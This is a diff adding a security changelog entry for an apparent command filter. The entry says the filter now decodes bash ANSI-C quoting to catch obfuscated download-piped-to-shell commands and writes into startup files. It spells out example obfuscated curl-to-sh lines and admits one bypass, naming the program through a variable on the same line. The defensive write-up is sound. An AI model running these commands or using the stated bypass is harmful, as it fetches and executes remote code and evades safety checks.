@@ -1,0 +1,2 @@
+### Security
+- The destructive-command check now decodes ANSI-C quoting (`$'...'`) the way bash does before it looks for a download piped into a shell or written into a startup file, so `$'\x63url' https://example.com/i.sh | $'\x73h'` and `curl -o ~/$'.bash\x72c' ...` are blocked. A literal `$'...'` that is only printed, as in `echo $'curl ... | sh'`, is still allowed. A program named by a variable set on the same line (`C=curl; $C ... | sh`) is a documented limit.
